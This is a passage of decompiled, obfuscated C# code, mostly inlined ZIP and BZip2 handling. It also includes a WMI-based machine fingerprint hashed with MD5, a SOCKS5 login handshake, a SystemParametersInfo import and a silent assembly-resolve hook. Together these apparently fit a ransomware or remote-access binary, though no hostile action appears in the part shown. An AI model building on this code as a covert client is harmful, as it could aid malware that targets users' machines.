				arg_18D_0.int_1 = arg_18C_0 + arg_179_0[expr_175] * 256 * 256 * 256;
				gClass.dateTime_0 = Class16.smethod_324(gClass.int_1);
				gClass.enum7_0 |= Enum7.flag_1;
				GClass0 arg_201_0 = gClass;
				byte[] arg_1BE_0 = array;
				int expr_1BA = 12;
				int arg_1BD_0 = expr_1BA + 1;
				int arg_1CE_0 = arg_1BE_0[expr_1BA];
				byte[] arg_1C7_0 = array;
				int expr_1C3 = 13;
				int arg_1C6_0 = expr_1C3 + 1;
				int arg_1E4_0 = arg_1CE_0 + arg_1C7_0[expr_1C3] * 256;
				byte[] arg_1D7_0 = array;
				int expr_1D3 = 14;
				int arg_1D6_0 = expr_1D3 + 1;
				int arg_200_0 = arg_1E4_0 + arg_1D7_0[expr_1D3] * 256 * 256;
				byte[] arg_1ED_0 = array;
				int expr_1E9 = 15;
				int arg_1EC_0 = expr_1E9 + 1;
				arg_201_0.int_2 = arg_200_0 + arg_1ED_0[expr_1E9] * 256 * 256 * 256;
				GClass0 arg_254_0 = gClass;
				byte[] arg_210_0 = array;
				int expr_20C = 16;
				int arg_20F_0 = expr_20C + 1;
				int arg_220_0 = arg_210_0[expr_20C];
				byte[] arg_219_0 = array;
				int expr_215 = 17;
				int arg_218_0 = expr_215 + 1;
				int arg_236_0 = arg_220_0 + arg_219_0[expr_215] * 256;
				byte[] arg_229_0 = array;
				int expr_225 = 18;
				int arg_228_0 = expr_225 + 1;
				int arg_252_0 = arg_236_0 + arg_229_0[expr_225] * 256 * 256;
				byte[] arg_23F_0 = array;
				int expr_23B = 19;
				int arg_23E_0 = expr_23B + 1;
				arg_254_0.long_0 = (long)((ulong)(arg_252_0 + arg_23F_0[expr_23B] * 256 * 256 * 256));
				GClass0 arg_2A7_0 = gClass;
				byte[] arg_263_0 = array;
				int expr_25F = 20;
				int arg_262_0 = expr_25F + 1;
				int arg_273_0 = arg_263_0[expr_25F];
				byte[] arg_26C_0 = array;
				int expr_268 = 21;
				int arg_26B_0 = expr_268 + 1;
				int arg_289_0 = arg_273_0 + arg_26C_0[expr_268] * 256;
				byte[] arg_27C_0 = array;
				int expr_278 = 22;
				int arg_27B_0 = expr_278 + 1;
				int arg_2A5_0 = arg_289_0 + arg_27C_0[expr_278] * 256 * 256;
				byte[] arg_292_0 = array;
				int expr_28E = 23;
				int arg_291_0 = expr_28E + 1;
				arg_2A7_0.long_2 = (long)((ulong)(arg_2A5_0 + arg_292_0[expr_28E] * 256 * 256 * 256));
				gClass.short_9 = gClass.short_8;
				GClass0 arg_2D6_0 = gClass;
				byte[] arg_2C4_0 = array;
				int expr_2C0 = 24;
				int arg_2C3_0 = expr_2C0 + 1;
				int arg_2D4_0 = arg_2C4_0[expr_2C0];
				byte[] arg_2CD_0 = array;
				int expr_2C9 = 25;
				int arg_2CC_0 = expr_2C9 + 1;
				arg_2D6_0.short_2 = (short)(arg_2D4_0 + arg_2CD_0[expr_2C9] * 256);
				GClass0 arg_2F7_0 = gClass;
				byte[] arg_2E5_0 = array;
				int expr_2E1 = 26;
				int arg_2E4_0 = expr_2E1 + 1;
				int arg_2F5_0 = arg_2E5_0[expr_2E1];
				byte[] arg_2EE_0 = array;
				int expr_2EA = 27;
				int arg_2ED_0 = expr_2EA + 1;
				arg_2F7_0.short_3 = (short)(arg_2F5_0 + arg_2EE_0[expr_2EA] * 256);
				GClass0 arg_318_0 = gClass;
				byte[] arg_306_0 = array;
				int expr_302 = 28;
				int arg_305_0 = expr_302 + 1;
				int arg_316_0 = arg_306_0[expr_302];
				byte[] arg_30F_0 = array;
				int expr_30B = 29;
				int arg_30E_0 = expr_30B + 1;
				arg_318_0.short_4 = (short)(arg_316_0 + arg_30F_0[expr_30B] * 256);
				GClass0 arg_338_0 = gClass;
				byte[] arg_327_0 = array;
				int expr_323 = 30;
				int arg_326_0 = expr_323 + 1;
				uint arg_337_0 = arg_327_0[expr_323];
				byte[] arg_330_0 = array;
				int expr_32C = 31;
				int arg_32F_0 = expr_32C + 1;
				arg_338_0.uint_0 = arg_337_0 + arg_330_0[expr_32C] * 256u;
				GClass0 arg_359_0 = gClass;
				byte[] arg_347_0 = array;
				int expr_343 = 32;
				int arg_346_0 = expr_343 + 1;
				int arg_357_0 = arg_347_0[expr_343];
				byte[] arg_350_0 = array;
				int expr_34C = 33;
				int arg_34F_0 = expr_34C + 1;
				arg_359_0.short_1 = (short)(arg_357_0 + arg_350_0[expr_34C] * 256);
				GClass0 arg_3AB_0 = gClass;
				byte[] arg_368_0 = array;
				int expr_364 = 34;
				int arg_367_0 = expr_364 + 1;
				int arg_378_0 = arg_368_0[expr_364];
				byte[] arg_371_0 = array;
				int expr_36D = 35;
				int arg_370_0 = expr_36D + 1;
				int arg_38E_0 = arg_378_0 + arg_371_0[expr_36D] * 256;
				byte[] arg_381_0 = array;
				int expr_37D = 36;
				int arg_380_0 = expr_37D + 1;
				int arg_3AA_0 = arg_38E_0 + arg_381_0[expr_37D] * 256 * 256;
				byte[] arg_397_0 = array;
				int expr_393 = 37;
				int arg_396_0 = expr_393 + 1;
				arg_3AB_0.int_0 = arg_3AA_0 + arg_397_0[expr_393] * 256 * 256 * 256;
				GClass0 arg_3FE_0 = gClass;
				byte[] arg_3BA_0 = array;
				int expr_3B6 = 38;
				int arg_3B9_0 = expr_3B6 + 1;
				int arg_3CA_0 = arg_3BA_0[expr_3B6];
				byte[] arg_3C3_0 = array;
				int expr_3BF = 39;
				int arg_3C2_0 = expr_3BF + 1;
				int arg_3E0_0 = arg_3CA_0 + arg_3C3_0[expr_3BF] * 256;
				byte[] arg_3D3_0 = array;
				int expr_3CF = 40;
				int arg_3D2_0 = expr_3CF + 1;
				int arg_3FC_0 = arg_3E0_0 + arg_3D3_0[expr_3CF] * 256 * 256;
				byte[] arg_3E9_0 = array;
				int expr_3E5 = 41;
				int arg_3E8_0 = expr_3E5 + 1;
				arg_3FE_0.long_4 = (long)((ulong)(arg_3FC_0 + arg_3E9_0[expr_3E5] * 256 * 256 * 256));
				gClass.bool_14 = ((gClass.short_1 & 1) == 1);
				array = new byte[(int)gClass.short_2];
				num3 = readStream.Read(array, 0, array.Length);
				num2 += num3;
				if ((gClass.short_7 & 2048) == 2048)
				{
					gClass.string_1 = Class16.smethod_393(array);
				}
				else
				{
					gClass.string_1 = Class16.smethod_112(encoding, array);
				}
				while (dictionary_0.ContainsKey(gClass.string_1))
				{
					gClass.string_1 = Class16.smethod_46(gClass.string_1);
					gClass.bool_6 = true;
				}
				if (gClass.AttributesIndicateDirectory)
				{
					Class16.smethod_404(gClass);
				}
				else if (gClass.string_1.EndsWith("/"))
				{
					Class16.smethod_404(gClass);
				}
				gClass.long_1 = gClass.long_0;
				if ((gClass.short_7 & 1) == 1)
				{
					GClass0 arg_4E8_0 = gClass;
					gClass.enum2_0 = Enum2.const_1;
					arg_4E8_0.enum2_1 = Enum2.const_1;
					gClass.bool_8 = true;
				}
				if (gClass.short_3 > 0)
				{
					gClass.bool_10 = (gClass.long_0 == (long)((ulong)-1) || gClass.long_2 == (long)((ulong)-1) || gClass.long_4 == (long)((ulong)-1));
					num2 += Class16.smethod_36(gClass.short_3, gClass, readStream);
					gClass.long_1 = gClass.long_0;
				}
				if (gClass.enum2_0 == Enum2.const_1)
				{
					gClass.long_1 -= 12L;
				}
				else if (gClass.enum2_0 == Enum2.const_2 || gClass.enum2_0 == Enum2.const_3)
				{
					gClass.long_1 = gClass.long_0 - (long)(Class16.smethod_543(gClass.enum2_0) + 10);
					gClass.int_4 = 10;
				}
				if ((gClass.short_7 & 8) == 8)
				{
					if (gClass.bool_10)
					{
						gClass.int_4 += 24;
					}
					else
					{
						gClass.int_4 += 16;
					}
				}
				gClass.AlternateEncoding = (((gClass.short_7 & 2048) == 2048) ? Encoding.UTF8 : encoding);
				gClass.AlternateEncodingUsage = Enum9.const_3;
				if (gClass.short_4 > 0)
				{
					array = new byte[(int)gClass.short_4];
					num3 = readStream.Read(array, 0, array.Length);
					num2 += num3;
					if ((gClass.short_7 & 2048) == 2048)
					{
						gClass.string_2 = Class16.smethod_393(array);
					}
					else
					{
						gClass.string_2 = Class16.smethod_112(encoding, array);
					}
				}
				return gClass;
			}
		}

		static int smethod_29(GClass2 gclass2_0, byte[] byte_0, int int_0, int int_1)
		{
			int num = gclass2_0.int_1;
			if (num > int_1)
			{
				num = int_1;
			}
			if (num == 0)
			{
				return 0;
			}
			gclass2_0.int_1 -= num;
			if (gclass2_0.class39_0.bool_1)
			{
				gclass2_0.uint_0 = Class16.smethod_62(gclass2_0.uint_0, gclass2_0.byte_0, gclass2_0.int_0, num);
			}
			Array.Copy(gclass2_0.byte_0, gclass2_0.int_0, byte_0, int_0, num);
			gclass2_0.int_0 += num;
			gclass2_0.long_0 += (long)num;
			return num;
		}

		static DateTime smethod_30(DateTime dateTime_0)
		{
			if (dateTime_0.Kind == DateTimeKind.Utc)
			{
				return dateTime_0;
			}
			DateTime result = dateTime_0;
			if (DateTime.Now.IsDaylightSavingTime() && !dateTime_0.IsDaylightSavingTime())
			{
				result = dateTime_0 - new TimeSpan(1, 0, 0);
			}
			else if (!DateTime.Now.IsDaylightSavingTime() && dateTime_0.IsDaylightSavingTime())
			{
				result = dateTime_0 + new TimeSpan(1, 0, 0);
			}
			return result;
		}

		static Enum9 smethod_31(Stream0 stream0_0)
		{
			return stream0_0.enum9_0;
		}

		static void smethod_32(string string_0, string string_1, string string_2, GClass1 gclass1_0)
		{
			foreach (GClass0 current in Class16.smethod_506(string_1, string_0, gclass1_0))
			{
				current.Password = gclass1_0.string_3;
				Class16.smethod_107(current, string_2);
			}
		}

		static void smethod_33(GClass0 gclass0_0)
		{
			Class16.smethod_146(".", null, gclass0_0, null);
		}

		static string smethod_34()
		{
			string text = "";
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_OperatingSystem");
			ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get();
			bool flag = !string.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432"));
			using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectCollection.GetEnumerator())
			{
				if (enumerator.MoveNext())
				{
					ManagementBaseObject current = enumerator.Current;
					ManagementObject managementObject = (ManagementObject)current;
					text = managementObject.Properties["Caption"].Value.ToString() + Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432") + managementObject.Properties["Version"].Value.ToString();
				}
			}
			text.Replace(" ", "");
			text.Replace("Windows", "");
			text.Replace("windows", "");
			text += (flag ? ":64" : "=32");
			MD5 mD = MD5.Create();
			byte[] value = mD.ComputeHash(Encoding.Default.GetBytes(text));
			string text2 = BitConverter.ToString(value);
			return text2.Replace("-", "");
		}

		[DllImport("user32.dll", CharSet = CharSet.Auto)]
		static extern int SystemParametersInfo(uint uint_0, uint uint_1, string string_0, uint uint_2);

		static void smethod_35(Stream12 stream12_0)
		{
			if (Class16.smethod_610(stream12_0) == null)
			{
				return;
			}
			if (stream12_0.enum22_0 == Enum22.const_0)
			{
				Class16.smethod_557(stream12_0.gclass2_0);
			}
			else
			{
				Class16.smethod_662(stream12_0.gclass2_0);
			}
			stream12_0.gclass2_0 = null;
		}

		static int smethod_36(short short_0, GClass0 gclass0_0, Stream stream_0)
		{
			int num = 0;
			if (short_0 > 0)
			{
				byte[] array = gclass0_0.byte_1 = new byte[(int)short_0];
				num = stream_0.Read(array, 0, array.Length);
				long long_ = stream_0.Position - (long)num;
				int num2 = 0;
				while (num2 + 3 < array.Length)
				{
					int num3 = num2;
					ushort num4 = (ushort)((int)array[num2++] + (int)array[num2++] * 256);
					short num5 = (short)((int)array[num2++] + (int)array[num2++] * 256);
					ushort num6 = num4;
					if (num6 <= 21589)
					{
						if (num6 <= 10)
						{
							if (num6 != 1)
							{
								if (num6 == 10)
								{
									num2 = Class16.smethod_438(gclass0_0, array, num2, num5, long_);
								}
							}
							else
							{
								num2 = Class16.smethod_474(gclass0_0, array, num2, num5, long_);
							}
						}
						else if (num6 != 23)
						{
							if (num6 == 21589)
							{
								num2 = Class16.smethod_259(gclass0_0, array, num2, num5, long_);
							}
						}
						else
						{
							num2 = Class16.smethod_133(gclass0_0, array, num2);
						}
					}
					else if (num6 <= 30805)
					{
						if (num6 != 22613)
						{
							if (num6 != 30805)
							{
							}
						}
						else
						{
							num2 = Class16.smethod_475(gclass0_0, array, num2, num5, long_);
						}
					}
					else if (num6 != 30837)
					{
						if (num6 == 39169)
						{
							num2 = Class16.smethod_129(gclass0_0, array, num2, num5, long_);
						}
					}
					num2 = num3 + (int)num5 + 4;
				}
			}
			return num;
		}

		static void smethod_37(GClass0 gclass0_0)
		{
			long position = gclass0_0.ArchiveStream.Position;
			try
			{
				gclass0_0.ArchiveStream.Seek(gclass0_0.long_4, SeekOrigin.Begin);
			}
			catch (IOException exception_)
			{
				string string_ = string.Format("Exception seeking  entry({0}) offset(0x{1:X8}) len(0x{2:X8})", gclass0_0.string_1, gclass0_0.long_4, gclass0_0.ArchiveStream.Length);
				throw new BadStateException(string_, exception_);
			}
			byte[] array = new byte[30];
			gclass0_0.ArchiveStream.Read(array, 0, array.Length);
			short num = (short)((int)array[26] + (int)array[27] * 256);
			short num2 = (short)((int)array[28] + (int)array[29] * 256);
			gclass0_0.ArchiveStream.Seek((long)(num + num2), SeekOrigin.Current);
			gclass0_0.int_3 = (int)(30 + num2 + num) + Class16.smethod_543(gclass0_0.enum2_1);
			gclass0_0.long_3 = gclass0_0.long_4 + (long)gclass0_0.int_3;
			gclass0_0.ArchiveStream.Seek(position, SeekOrigin.Begin);
		}

		static void smethod_38(ZipSegmentedStream zipSegmentedStream_0)
		{
			if (zipSegmentedStream_0.stream_0 != null)
			{
				zipSegmentedStream_0.stream_0.Dispose();
			}
			if (zipSegmentedStream_0.uint_0 + 1u == zipSegmentedStream_0.uint_1)
			{
				zipSegmentedStream_0.string_2 = zipSegmentedStream_0.string_0;
			}
			zipSegmentedStream_0.stream_0 = File.OpenRead(Class16.smethod_455(zipSegmentedStream_0));
		}

		static bool smethod_39()
		{
			return IntPtr.Size == 8;
		}

		static bool smethod_40(Class17 class17_0, GClass0 gclass0_0)
		{
			return class17_0.class9_0.vmethod_1(gclass0_0);
		}

		static void smethod_41(Stream6 stream6_0)
		{
			if (stream6_0.class35_0 == null)
			{
				return;
			}
			Stream6.Class35 class35_ = stream6_0.class35_0;
			int[] array = Class16.smethod_58(class35_, stream6_0.int_0 + 1);
			int i;
			for (i = 0; i <= 255; i++)
			{
				if (class35_.int_0[i] < 0 || class35_.int_0[i] > stream6_0.int_0)
				{
					throw new Exception("BZ_DATA_ERROR");
				}
			}
			class35_.int_5[0] = 0;
			for (i = 1; i <= 256; i++)
			{
				class35_.int_5[i] = class35_.int_0[i - 1];
			}
			for (i = 1; i <= 256; i++)
			{
				class35_.int_5[i] += class35_.int_5[i - 1];
			}
			for (i = 0; i <= 256; i++)
			{
				if (class35_.int_5[i] < 0 || class35_.int_5[i] > stream6_0.int_0 + 1)
				{
					string message = string.Format("BZ_DATA_ERROR: cftab[{0}]={1} last={2}", i, class35_.int_5[i], stream6_0.int_0);
					throw new Exception(message);
				}
			}
			for (i = 1; i <= 256; i++)
			{
				if (class35_.int_5[i - 1] > class35_.int_5[i])
				{
					throw new Exception("BZ_DATA_ERROR");
				}
			}
			i = 0;
			int int_ = stream6_0.int_0;
			while (i <= int_)
			{
				array[class35_.int_5[(int)(class35_.byte_5[i] & 255)]++] = i;
				i++;
			}
			if (stream6_0.int_1 < 0 || stream6_0.int_1 >= array.Length)
			{
				throw new IOException("stream corrupted");
			}
			stream6_0.int_14 = array[stream6_0.int_1];
			stream6_0.int_7 = 0;
			stream6_0.int_10 = 0;
			stream6_0.int_8 = 256;
			if (stream6_0.bool_2)
			{
				stream6_0.int_12 = 0;
				stream6_0.int_13 = 0;
				Class16.smethod_280(stream6_0);
				return;
			}
			Class16.smethod_60(stream6_0);
		}

		static void smethod_42(int int_0, int int_1, int[] int_2, int int_3)
		{
			int_0 += int_3;
			while (int_3 < int_0)
			{
				int num = int_2[int_3];
				int_2[int_3++] = int_2[int_1];
				int_2[int_1++] = num;
			}
		}

		static void smethod_43(byte[] byte_0, Class57 class57_0)
		{
			switch (byte_0[3])
			{
			case 1:
				class57_0.byte_0 = new byte[5];
				goto IL_4D;
			case 3:
				class57_0.byte_0 = new byte[(int)(byte_0[4] + 2)];
				goto IL_4D;
			case 4:
				byte_0 = new byte[17];
				goto IL_4D;
			}
			throw new ProtocolViolationException();
			IL_4D:
			class57_0.int_0 = 0;
			Class16.smethod_130(class57_0).BeginReceive(Class16.smethod_515(class57_0), 0, Class16.smethod_515(class57_0).Length, SocketFlags.None, new AsyncCallback(class57_0.method_6), Class16.smethod_130(class57_0));
		}

		static void smethod_44(Class43 class43_0, int int_0, int int_1, int[] int_2, int int_3, int[] int_4, int int_5)
		{
			class43_0.int_0 = 0;
			class43_0.byte_0 = (byte)int_0;
			class43_0.byte_1 = (byte)int_1;
			class43_0.int_8 = int_2;
			class43_0.int_9 = int_3;
			class43_0.int_10 = int_4;
			class43_0.int_11 = int_5;
			class43_0.int_2 = null;
		}

		static int smethod_45(Class74.Class76 class76_0, int int_0)
		{
			if (class76_0.int_2 < int_0)
			{
				if (class76_0.int_0 == class76_0.int_1)
				{
					return -1;
				}
				class76_0.uint_0 |= (uint)((uint)((int)(class76_0.byte_0[class76_0.int_0++] & 255) | (int)(class76_0.byte_0[class76_0.int_0++] & 255) << 8) << class76_0.int_2);
				class76_0.int_2 += 16;
			}
			return (int)((ulong)class76_0.uint_0 & (ulong)((long)((1 << int_0) - 1)));
		}

		static string smethod_46(string string_0)
		{
			GClass0.Class23.int_0++;
			if (GClass0.Class23.int_0 > 25)
			{
				throw new OverflowException("overflow while creating filename");
			}
			int num = 1;
			int num2 = string_0.LastIndexOf(".");
			if (num2 == -1)
			{
				Match match = GClass0.Class23.regex_0.Match(string_0);
				if (match.Success)
				{
					num = int.Parse(match.Groups[1].Value) + 1;
					string str = string.Format(" (copy {0})", num);
					string_0 = string_0.Substring(0, match.Index) + str;
				}
				else
				{
					string str2 = string.Format(" (copy {0})", num);
					string_0 += str2;
				}
			}
			else
			{
				Match match2 = GClass0.Class23.regex_0.Match(string_0.Substring(0, num2));
				if (match2.Success)
				{
					num = int.Parse(match2.Groups[1].Value) + 1;
					string str3 = string.Format(" (copy {0})", num);
					string_0 = string_0.Substring(0, match2.Index) + str3 + string_0.Substring(num2);
				}
				else
				{
					string str4 = string.Format(" (copy {0})", num);
					string_0 = string_0.Substring(0, num2) + str4 + string_0.Substring(num2);
				}
			}
			return string_0;
		}

		static byte[] smethod_47(GClass0 gclass0_0)
		{
			string text = Class16.smethod_304(gclass0_0);
			switch (gclass0_0.AlternateEncodingUsage)
			{
			case Enum9.const_0:
				if (gclass0_0.string_2 != null && gclass0_0.string_2.Length != 0)
				{
					gclass0_0.byte_0 = GClass0.encoding_0.GetBytes(gclass0_0.string_2);
				}
				gclass0_0.encoding_1 = GClass0.encoding_0;
				return GClass0.encoding_0.GetBytes(text);
			case Enum9.const_3:
				if (gclass0_0.string_2 != null && gclass0_0.string_2.Length != 0)
				{
					gclass0_0.byte_0 = gclass0_0.AlternateEncoding.GetBytes(gclass0_0.string_2);
				}
				gclass0_0.encoding_1 = gclass0_0.AlternateEncoding;
				return gclass0_0.AlternateEncoding.GetBytes(text);
			}
			byte[] bytes = GClass0.encoding_0.GetBytes(text);
			string @string = GClass0.encoding_0.GetString(bytes, 0, bytes.Length);
			gclass0_0.byte_0 = null;
			if (@string != text)
			{
				bytes = gclass0_0.AlternateEncoding.GetBytes(text);
				if (gclass0_0.string_2 != null && gclass0_0.string_2.Length != 0)
				{
					gclass0_0.byte_0 = gclass0_0.AlternateEncoding.GetBytes(gclass0_0.string_2);
				}
				gclass0_0.encoding_1 = gclass0_0.AlternateEncoding;
				return bytes;
			}
			gclass0_0.encoding_1 = GClass0.encoding_0;
			if (gclass0_0.string_2 == null || gclass0_0.string_2.Length == 0)
			{
				return bytes;
			}
			byte[] bytes2 = GClass0.encoding_0.GetBytes(gclass0_0.string_2);
			string string2 = GClass0.encoding_0.GetString(bytes2, 0, bytes2.Length);
			if (string2 != gclass0_0.string_2)
			{
				bytes = gclass0_0.AlternateEncoding.GetBytes(text);
				gclass0_0.byte_0 = gclass0_0.AlternateEncoding.GetBytes(gclass0_0.string_2);
				gclass0_0.encoding_1 = gclass0_0.AlternateEncoding;
				return bytes;
			}
			gclass0_0.byte_0 = bytes2;
			return bytes;
		}

		static EventArgs1 smethod_48(GClass0 gclass0_0, long long_0, string string_0, long long_1)
		{
			return new EventArgs1(string_0, Enum6.const_7)
			{
				gclass0_0 = gclass0_0,
				long_0 = long_1,
				long_1 = long_0
			};
		}

		static void smethod_49(byte byte_0, GClass3 gclass3_0, int int_0)
		{
			while (int_0-- > 0)
			{
				if (gclass3_0.bool_0)
				{
					uint num = gclass3_0.uint_2 >> 24 ^ (uint)byte_0;
					gclass3_0.uint_2 = (gclass3_0.uint_2 << 8 ^ gclass3_0.uint_1[(int)((UIntPtr)num)]);
				}
				else
				{
					uint num2 = (gclass3_0.uint_2 & 255u) ^ (uint)byte_0;
					gclass3_0.uint_2 = (gclass3_0.uint_2 >> 8 ^ gclass3_0.uint_1[(int)((UIntPtr)num2)]);
				}
			}
		}

		static bool smethod_50(Class39 class39_0, int int_0, int int_1)
		{
			class39_0.byte_0[class39_0.int_46 + class39_0.int_45 * 2] = (byte)((uint)int_0 >> 8);
			class39_0.byte_0[class39_0.int_46 + class39_0.int_45 * 2 + 1] = (byte)int_0;
			class39_0.byte_0[class39_0.int_43 + class39_0.int_45] = (byte)int_1;
			class39_0.int_45++;
			if (int_0 == 0)
			{
				short[] expr_69_cp_0 = class39_0.short_2;
				int expr_69_cp_1 = int_1 * 2;
				expr_69_cp_0[expr_69_cp_1] += 1;
			}
			else
			{
				class39_0.int_49++;
				int_0--;
				short[] expr_A8_cp_0 = class39_0.short_2;
				int expr_A8_cp_1 = ((int)Class47.sbyte_2[int_1] + Class49.int_3 + 1) * 2;
				expr_A8_cp_0[expr_A8_cp_1] += 1;
				short[] expr_C9_cp_0 = class39_0.short_3;
				int expr_C9_cp_1 = Class16.smethod_385(int_0) * 2;
				expr_C9_cp_0[expr_C9_cp_1] += 1;
			}
			if ((class39_0.int_45 & 8191) == 0 && class39_0.enum20_0 > Enum20.const_4)
			{
				int num = class39_0.int_45 << 3;
				int num2 = class39_0.int_36 - class39_0.int_32;
				for (int i = 0; i < Class49.int_2; i++)
				{
					num = (int)((long)num + (long)class39_0.short_3[i * 2] * (5L + (long)Class47.int_2[i]));
				}
				num >>= 3;
				if (class39_0.int_49 < class39_0.int_45 / 2 && num < num2 / 2)
				{
					return true;
				}
			}
			return class39_0.int_45 == class39_0.int_44 - 1 || class39_0.int_45 == class39_0.int_44;
		}

		static void smethod_51(int int_0, Class64 class64_0)
		{
			if (int_0 <= 0)
			{
				throw new ArgumentException();
			}
			class64_0.int_0 = int_0;
			Class16.smethod_578(class64_0);
		}

		static void smethod_52(Stream6 stream6_0)
		{
			char c = Class16.smethod_631(stream6_0);
			char c2 = Class16.smethod_631(stream6_0);
			char c3 = Class16.smethod_631(stream6_0);
			char c4 = Class16.smethod_631(stream6_0);
			char c5 = Class16.smethod_631(stream6_0);
			char c6 = Class16.smethod_631(stream6_0);
			if (c == '\u0017' && c2 == 'r' && c3 == 'E' && c4 == '8' && c5 == 'P' && c6 == '\u0090')
			{
				Class16.smethod_430(stream6_0);
				return;
			}
			if (c == '1' && c2 == 'A' && c3 == 'Y' && c4 == '&' && c5 == 'S')
			{
				if (c6 == 'Y')
				{
					stream6_0.uint_0 = Class16.smethod_286(stream6_0);
					stream6_0.bool_2 = (Class16.smethod_434(stream6_0, 1) == 1);
					if (stream6_0.class35_0 == null)
					{
						stream6_0.class35_0 = new Stream6.Class35(stream6_0.int_2);
					}
					Class16.smethod_480(stream6_0);
					stream6_0.gclass3_0.uint_2 = 4294967295u;
					stream6_0.enum11_0 = Stream6.Enum11.const_1;
					return;
				}
			}
			stream6_0.enum11_0 = Stream6.Enum11.const_0;
			string message = string.Format("bad block header at offset 0x{0:X}", stream6_0.stream_0.Position);
			throw new IOException(message);
		}

		static int smethod_53(Class64 class64_0)
		{
			return class64_0.int_0;
		}

		static GClass0 smethod_54(Delegate2 delegate2_0, string string_0, Delegate1 delegate1_0)
		{
			return Class16.smethod_381(delegate1_0, string_0, Enum0.const_5, delegate2_0);
		}

		static void smethod_55(GClass1 gclass1_0, string string_0)
		{
			Class16.smethod_535(string_0, null, gclass1_0);
		}

		static GClass1 smethod_56(Stream stream_0)
		{
			return Class16.smethod_440(stream_0, null, null, null);
		}

		static GClass0 smethod_57(string string_0, string string_1, GClass1 gclass1_0)
		{
			return Class16.smethod_629(Enum10.const_0, string_1, gclass1_0, string_0);
		}

		static int[] smethod_58(Stream6.Class35 class35_0, int int_0)
		{
			int[] array = class35_0.int_6;
			if (array == null || array.Length < int_0)
			{
				array = (class35_0.int_6 = new int[int_0]);
			}
			return array;
		}

		static void smethod_59()
		{
			try
			{
				Class72.smethod_0();
			}
			catch (Exception)
			{
			}
		}

		static void smethod_60(Stream6 stream6_0)
		{
			if (stream6_0.int_10 <= stream6_0.int_0)
			{
				stream6_0.int_9 = stream6_0.int_8;
				int num = (int)(stream6_0.class35_0.byte_5[stream6_0.int_14] & 255);
				stream6_0.int_8 = num;
				stream6_0.int_14 = stream6_0.class35_0.int_6[stream6_0.int_14];
				stream6_0.int_10++;
				stream6_0.int_6 = num;
				stream6_0.enum11_0 = Stream6.Enum11.const_6;
				Class16.smethod_623(stream6_0.gclass3_0, (byte)num);
				return;
			}
			stream6_0.enum11_0 = Stream6.Enum11.const_5;
			Class16.smethod_521(stream6_0);
			Class16.smethod_52(stream6_0);
			Class16.smethod_41(stream6_0);
		}

		static void smethod_61(Class31 class31_0, GClass1 gclass1_0, string string_0)
		{
			if (gclass1_0.string_0 == null)
			{
				gclass1_0.stream_1 = null;
			}
			gclass1_0.bool_13 = true;
			gclass1_0.string_0 = string_0;
			if (Directory.Exists(gclass1_0.string_0))
			{
				throw new ZipException("Bad Directory", new ArgumentException("That name specifies an existing directory. Please specify a filename.", "exeToGenerate"));
			}
			gclass1_0.bool_5 = true;
			gclass1_0.bool_4 = File.Exists(gclass1_0.string_0);
			gclass1_0.method_2(string_0, class31_0);
			Class16.smethod_341(gclass1_0);
			gclass1_0.bool_13 = false;
		}

		static uint smethod_62(uint uint_0, byte[] byte_0, int int_0, int int_1)
		{
			if (byte_0 == null)
			{
				return 1u;
			}
			uint num = uint_0 & 65535u;
			uint num2 = uint_0 >> 16 & 65535u;
			while (int_1 > 0)
			{
				int i = (int_1 < Class51.int_0) ? int_1 : Class51.int_0;
				int_1 -= i;
				while (i >= 16)
				{
					num += (uint)byte_0[int_0++];
					num2 += num;
					num += (uint)byte_0[int_0++];
					num2 += num;
					num += (uint)byte_0[int_0++];
					num2 += num;
					num += (uint)byte_0[int_0++];
					num2 += num;
					num += (uint)byte_0[int_0++];
					num2 += num;
					num += (uint)byte_0[int_0++];
					num2 += num;
					num += (uint)byte_0[int_0++];
					num2 += num;
					num += (uint)byte_0[int_0++];
					num2 += num;
					num += (uint)byte_0[int_0++];
					num2 += num;
					num += (uint)byte_0[int_0++];
					num2 += num;
					num += (uint)byte_0[int_0++];
					num2 += num;
					num += (uint)byte_0[int_0++];
					num2 += num;
					num += (uint)byte_0[int_0++];
					num2 += num;
					num += (uint)byte_0[int_0++];
					num2 += num;
					num += (uint)byte_0[int_0++];
					num2 += num;
					num += (uint)byte_0[int_0++];
					num2 += num;
					i -= 16;
				}
				if (i != 0)
				{
					do
					{
						num += (uint)byte_0[int_0++];
						num2 += num;
					}
					while (--i != 0);
				}
				num %= Class51.uint_0;
				num2 %= Class51.uint_0;
			}
			return num2 << 16 | num;
		}

		static void smethod_63(GClass1 gclass1_0, string string_0)
		{
			foreach (GClass0 current in Class16.smethod_227(string_0, gclass1_0))
			{
				current.Password = gclass1_0.string_3;
				Class16.smethod_33(current);
			}
		}

		static byte[] smethod_64(Class60 class60_0)
		{
			byte[] array = new byte[3 + Class16.smethod_91(class60_0).Length + Class16.smethod_111(class60_0).Length];
			array[0] = 1;
			array[1] = (byte)Class16.smethod_91(class60_0).Length;
			Array.Copy(Encoding.ASCII.GetBytes(Class16.smethod_91(class60_0)), 0, array, 2, Class16.smethod_91(class60_0).Length);
			array[Class16.smethod_91(class60_0).Length + 2] = (byte)Class16.smethod_111(class60_0).Length;
			Array.Copy(Encoding.ASCII.GetBytes(Class16.smethod_111(class60_0)), 0, array, Class16.smethod_91(class60_0).Length + 3, Class16.smethod_111(class60_0).Length);
			return array;
		}

		static void smethod_65()
		{
			try
			{
				AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(Class16.smethod_601);
			}
			catch
			{
			}
		}

		static byte[] smethod_66(Class20 class20_0)
		{
			if (!class20_0.bool_0)
			{
				Class16.smethod_88(class20_0);
			}
			return class20_0.byte_5;
		}

		static void smethod_67(int int_0, Stream3 stream3_0, byte[] byte_0, int int_1)
		{
			int num = int_1;
			int num2 = int_0 + int_1;
			while (num < byte_0.Length && num < num2)
			{
				int num3 = Class16.smethod_348(stream3_0, byte_0, num, num2);
				num += num3;
			}
		}

		static int smethod_68(Class74.Class78 class78_0, Class74.Class76 class76_0)
		{
			int num;
			if ((num = Class16.smethod_45(class76_0, 9)) >= 0)
			{
				int num2;
				if ((num2 = (int)class78_0.short_0[num]) >= 0)
				{
					Class16.smethod_180(class76_0, num2 & 15);
					return num2 >> 4;
